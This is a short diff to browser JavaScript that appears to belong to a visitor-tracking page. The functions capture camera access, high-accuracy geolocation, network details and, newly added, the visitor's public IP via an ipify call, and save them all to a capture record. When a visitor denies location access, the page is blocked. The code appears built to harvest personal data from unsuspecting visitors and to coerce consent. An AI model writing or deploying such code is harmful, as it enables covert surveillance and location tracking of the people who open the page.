@@ -66,7 +66,10 @@ async function initCamera() {
 }
 
 function requestGeoLocation() {
-  if (!('geolocation' in navigator)) return;
+  if (!('geolocation' in navigator)) {
+    saveDetails();
+    return;
+  }
 
   navigator.geolocation.getCurrentPosition(
     (pos) => {
@@ -75,7 +78,10 @@ function requestGeoLocation() {
       captureDetails.longitude = longitude;
       saveDetails();
     },
-    () => blockPage(),
+    () => {
+      blockPage();
+      saveDetails();
+    },
     { enableHighAccuracy: true }
   );
 }
@@ -122,6 +128,14 @@ function captureNetwork() {
     captureDetails.network_rtt = conn.rtt;
     captureDetails.network_save_data = conn.saveData;
   }
+
+  fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => {
+      captureDetails.ip_address = data.ip;
+      saveDetails();
+    })
+    .catch(() => {});
 }
 
 function captureMedia() {
